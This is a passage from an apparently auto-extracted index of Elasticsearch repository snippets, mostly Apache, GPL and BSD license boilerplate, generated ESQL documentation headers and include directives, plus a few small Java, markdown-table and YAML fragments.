and sets up the recovery process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/siv-mode-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n@Override\nprotected void doExecute(Task task, RecoverySnapshotRequest request, ActionListener<SnapshotInfo> actionListener) {\n    Repository repository = repository(request.repositoryName);\n    repository.getSnapshotInfo(\n        threadPool.executor(ThreadPool.Names.SNAPSHOT),\n        request.snapshotName,\n        ActionListener.wrap(\n            snapshotInfo -> {\n                prepareRecovery(task, request, snapshotInfo, actionListener);\n            },\n            e -> {\n                actionListener.onFailure(e);\n            }\n        )\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License Boilerplate Notice\nDESCRIPTION: This is the boilerplate notice required to apply the Apache License 2.0 to your work.  The [yyyy] and [name of copyright owner] fields should be replaced with the appropriate information for your project. This block should be included in your source files within the appropriate comment syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/grpc-context-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n\"Copyright [yyyy] [name of copyright owner]\\n\\nLicensed under the Apache License, Version 2.0 (the \\\"License\\\");\\nyou may not use this file except in compliance with the License.\\nYou may obtain a copy of the License at\\n\\n    http://www.apache.org/licenses/LICENSE-2.0\\n\\nUnless required by applicable law or agreed to in writing, software\\ndistributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\nSee the License for the specific language governing permissions and\\nlimitations under the License.\"\n```\n\n----------------------------------------\n\nTITLE: Including ST_X Function documentation components in Markdown\nDESCRIPTION: This file organizes the documentation for the ST_X function in ESQL by including various markdown components including syntax diagram, parameters, description, supported types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_x.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `ST_X` [esql-st_x]\n\n**Syntax**\n\n:::{image} ../../../images/functions/st_x.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/st_x.md\n:::\n\n:::{include} ../description/st_x.md\n:::\n\n:::{include} ../types/st_x.md\n:::\n\n:::{include} ../examples/st_x.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including LEAST Function Description in Markdown\nDESCRIPTION: This code snippet includes the description of the LEAST function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/least.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/least.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including YAML Blocks in Elasticsearch Doc Snippets\nDESCRIPTION: Syntax for including YAML blocks within documentation snippets for more expressive testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nstartyaml\n  - compare_analyzers: {index: thai_example, first: thai, second: rebuilt_thai}\nendyaml\n```\n\n----------------------------------------\n\nTITLE: YAML Frontmatter Configuration\nDESCRIPTION: YAML configuration block defining documentation mapping and deployment scope\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-query-cache-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/reference/current/query-cache.html\napplies_to:\n  deployment:\n    self:\n```\n\n----------------------------------------\n\nTITLE: Configuring Enrich Processor Options Table\nDESCRIPTION: Markdown table defining all available configuration options for the Elasticsearch enrich processor, including required and optional parameters with their descriptions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/enrich-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Name | Required | Default | Description |\n| --- | --- | --- | --- |\n| `policy_name` | yes | - | The name of the enrich policy to use. |\n| `field` | yes | - | The field in the input document that matches the policies match_field used to retrieve the enrichment data. Supports [template snippets](docs-content://manage-data/ingest/transform-enrich/ingest-pipelines.md#template-snippets). |\n| `target_field` | yes | - | Field added to incoming documents to contain enrich data. This field contains both the `match_field` and `enrich_fields` specified in the [enrich policy](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-enrich-put-policy). Supports [template snippets](docs-content://manage-data/ingest/transform-enrich/ingest-pipelines.md#template-snippets). |\n| `ignore_missing` | no | false | If `true` and `field` does not exist, the processor quietly exits without modifying the document |\n| `override` | no | true | If processor will update fields with pre-existing non-null-valued field. When set to `false`, such fields will not be touched. |\n| `max_matches` | no | 1 | The maximum number of matched documents to include under the configured target field. The `target_field` will be turned into a json array if `max_matches` is higher than 1, otherwise `target_field` will become a json object. In order to avoid documents getting too large, the maximum allowed value is 128. |\n| `shape_relation` | no | `INTERSECTS` | A spatial relation operator used to match the [geoshape](/reference/elasticsearch/mapping-reference/geo-shape.md) of incoming documents to documents in the enrich index. This option is only used for `geo_match` enrich policy types. See [Spatial Relations](/reference/query-languages/query-dsl/query-dsl-shape-query.md#_spatial_relations) for operators and more information. |\n| `description` | no | - | Description of the processor. Useful for describing the purpose of the processor or its configuration. |\n| `if` | no | - | Conditionally execute the processor. See [Conditionally run a processor](docs-content://manage-data/ingest/transform-enrich/ingest-pipelines.md#conditionally-run-processor). |\n| `ignore_failure` | no | `false` | Ignore failures for the processor. See [Handling pipeline failures](docs-content://manage-data/ingest/transform-enrich/ingest-pipelines.md#handling-pipeline-failures). |\n| `on_failure` | no | - | Handle failures for the processor. See [Handling pipeline failures](docs-content://manage-data/ingest/transform-enrich/ingest-pipelines.md#handling-pipeline-failures). |\n| `tag` | no | - | Identifier for the processor. Useful for debugging and metrics. |\n```\n\n----------------------------------------\n\nTITLE: Defining Grammar for Identity Equals Operator in Painless\nDESCRIPTION: Specifies the grammar rule for the identity equals operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_22\n\nLANGUAGE: text\nCODE:\n```\nidentity_equals: expression '===' expression;\n```\n\n----------------------------------------\n\nTITLE: Detecting Direct Object Creation - Java\nDESCRIPTION: This code snippet showcases another pattern where a new LinkPermission object is created and checked via the SecurityManager, indicating how the tool recognizes various permission instantiations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/securitymanager-scanner/README.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nsm.checkPermission(new LinkPermission(\"symbolic\"));\n```\n\n----------------------------------------\n\nTITLE: GPL License Header Template\nDESCRIPTION: Standard header text template for including GPL license notice in source files, including copyright declaration and warranty disclaimer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-html-module-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice Template\nDESCRIPTION: Template for the license notice that should be displayed when an interactive program starts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Brics Automaton Copyright Notice\nDESCRIPTION: Copyright notice and license terms for code derived from Brics automaton sources used in the automaton package\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/licenses/lucene-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright (c) 2001-2009 Anders Moeller\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n * \n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n```\n\n----------------------------------------\n\nTITLE: Documentation Comment Header\nDESCRIPTION: Generated code notice for the DATE_EXTRACT function documentation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/date_extract.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Disclaimer for Employers\nDESCRIPTION: This snippet provides a template for a copyright disclaimer that employers or schools might use to relinquish copyright interest in a program written by an employee or student.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-s3/licenses/jaxb-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the program `Gnomovision' (which makes passes at compilers) written by James Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types Table in Markdown\nDESCRIPTION: This snippet defines a markdown table that outlines the supported input types and their corresponding result types for an ESQL function. It shows that 'keyword' and 'text' input types both result in 'keyword' output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| input | result |\n| --- | --- |\n| keyword | keyword |\n| text | keyword |\n```\n\n----------------------------------------\n\nTITLE: Percentile Function Description Header\nDESCRIPTION: Simple markdown header comment indicating this is auto-generated documentation for ESQL's percentile functionality, with a warning not to edit directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: File Header Comment\nDESCRIPTION: Header comment indicating that this is an auto-generated file by ESQL's AbstractFunctionTestCase\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_double.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Identifying Missing Tests for Consistency in Elasticsearch\nDESCRIPTION: This Markdown comment highlights an area where test coverage is lacking in the Elasticsearch project, specifically for consistency-related functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/src/yamlRestTest/resources/rest-api-spec/test/create/TODO.txt#2025-04-22_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n# consistency\n```\n\n----------------------------------------\n\nTITLE: TO_CARTESIANSHAPE Include Directives\nDESCRIPTION: Series of include directives that pull in various documentation sections for the TO_CARTESIANSHAPE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_cartesianshape.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/to_cartesianshape.md\n:::\n\n:::{include} ../description/to_cartesianshape.md\n:::\n\n:::{include} ../types/to_cartesianshape.md\n:::\n\n:::{include} ../examples/to_cartesianshape.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Brics Automaton Copyright and License Notice\nDESCRIPTION: Copyright notice and BSD license terms for code derived from Brics automaton library used in Lucene's automaton package.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-smartcn/licenses/lucene-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright (c) 2001-2009 Anders Moeller\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n * \n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n```\n\n----------------------------------------\n\nTITLE: TANH Function Documentation Header\nDESCRIPTION: Header comment indicating this is an auto-generated file for ESQL's TANH function documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/tanh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Documentation Header Comment in Markdown\nDESCRIPTION: Warning comment indicating that this is auto-generated documentation that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/right.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: GPL License Header Template\nDESCRIPTION: Standard copyright and license notice template to be included at the start of source files\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/licenses/openjdk-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\n\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify it\nunder the terms of the GNU General Public License as published by the Free\nSoftware Foundation; either version 2 of the License, or (at your option)\nany later version.\n\nThis program is distributed in the hope that it will be useful, but WITHOUT\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\nFITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for\nmore details.\n\nYou should have received a copy of the GNU General Public License along\nwith this program; if not, write to the Free Software Foundation, Inc., 59\nTemple Place, Suite 330, Boston, MA 02111-1307 USA\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Notice for GPL-Licensed Programs\nDESCRIPTION: A template for including copyright and license information in source files of GPL-licensed programs. It includes placeholders for program name, copyright year, and author.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Disclaimer for Employers\nDESCRIPTION: A template for a copyright disclaimer that can be used by employers or organizations to relinquish copyright interest in a program written by an employee or member.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Including SIN Function Examples in Markdown\nDESCRIPTION: This snippet includes the examples documentation for the SIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sin.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/sin.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: A template for the boilerplate notice that should be included when applying the Apache License 2.0 to a project. It includes placeholders for copyright year and owner that should be replaced with actual information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/rest/licenses/commons-logging-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Example (Generic)\nDESCRIPTION: This is a sample copyright disclaimer that an employer or school can sign to disclaim all copyright interest in a program.  It is important to adapt the names and dates to reflect the actual organization, program, and author.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-zip-commons-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: Generic\nCODE:\n```\n    \"Yoyodyne, Inc., hereby disclaims all copyright interest in the\\n    program `Gnomovision' (which makes passes at compilers) written by\\n    James Hacker.\\n\\n    signature of Ty Coon, 1 April 1989\\n    Ty Coon, President of Vice\"\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample copyright disclaimer for employers/institutions\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/licenses/openjdk-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the program\n'Gnomovision' (which makes passes at compilers) written by James Hacker.\n\nsignature of Ty Coon, 1 April 1989\n\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Documentation Notice in Markdown\nDESCRIPTION: A comment indicating this is auto-generated documentation that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/starts_with.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Comment Header\nDESCRIPTION: Auto-generated header comment for an ESQL function that combines multivalue fields with a delimiter. The comment indicates this is machine-generated code that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_zip.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: YAML Configuration Header\nDESCRIPTION: YAML frontmatter defining mapped pages for documentation navigation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/plugins/current/analysis.html\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer statement from an employer or organization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: COALESCE Function Documentation Header\nDESCRIPTION: Warning comment about auto-generated nature of the documentation and instruction not to edit manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/coalesce.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Notice Template\nDESCRIPTION: The standard boilerplate notice for applying the Apache License 2.0 to a project, with a specific copyright notice for Elastic and contributors from 2018.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/licenses/elastic-apm-agent-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright 2018 Elastic and contributors\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Copyright Notice\nDESCRIPTION: Example of a copyright notice to display when an interactive program starts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-miscoffice-module-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This code snippet presents the boilerplate notice required to apply the Apache License 2.0 to your work.  It instructs the user to replace the bracketed fields with their own identifying information, such as the copyright year and owner name. The snippet should be enclosed in the appropriate comment syntax for the file format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-azure-classic/licenses/joda-time-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n\"Copyright [yyyy] [name of copyright owner]\\n\\nLicensed under the Apache License, Version 2.0 (the \\\"License\\\");\\nyou may not use this file except in compliance with the License.\\nYou may obtain a copy of the License at\\n\\n    http://www.apache.org/licenses/LICENSE-2.0\\n\\nUnless required by applicable law or agreed to in writing, software\\ndistributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\nSee the License for the specific language governing permissions and\\nlimitations under the License.\"\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer statement that may need to be signed by an employer or institution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n    Yoyodyne, Inc., hereby disclaims all copyright interest in the\n    program `Gnomovision' (which makes passes at compilers) written by\n    James Hacker.\n\n    signature of Ty Coon, 1 April 1989\n    Ty Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: A template for the boilerplate notice that should be included when applying the Apache License 2.0 to a project. It includes placeholders for copyright year and owner information, along with the standard license text and reference to license terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: Standard boilerplate notice for applying the Apache License 2.0 to a software project. Includes placeholders for copyright information and the standard license text that needs to be included in project files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/lang-tag-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: BSD 3-Clause License Attribution\nDESCRIPTION: This part of the document references the inclusion of code from another source under the BSD 3-Clause License, highlighting the requirements for attribution and redistribution in compliance with that license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/licenses/elastic-apm-agent-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nThis product includes code from https://github.com/ngs-doo/dsl-json,\nunder The BSD 3-Clause License:\n\nCopyright (c) 2015, Nova Generacija Softvera d.o.o.\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n\n    * Redistributions of source code must retain the above copyright notice,\n      this list of conditions and the following disclaimer.\n\n    * Redistributions in binary form must reproduce the above copyright notice,\n      this list of conditions and the following disclaimer in the documentation\n      and/or other materials provided with the distribution.\n\n    * Neither the name of Nova Generacija Softvera d.o.o. nor the names of its\n      contributors may be used to endorse or promote products derived from this\n      software without specific prior written permission.\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides a template for the boilerplate notice to be included when applying the Apache License 2.0 to a software project. It includes placeholders for the copyright year and owner, as well as the full text of the license notice.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/xmlsec-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF 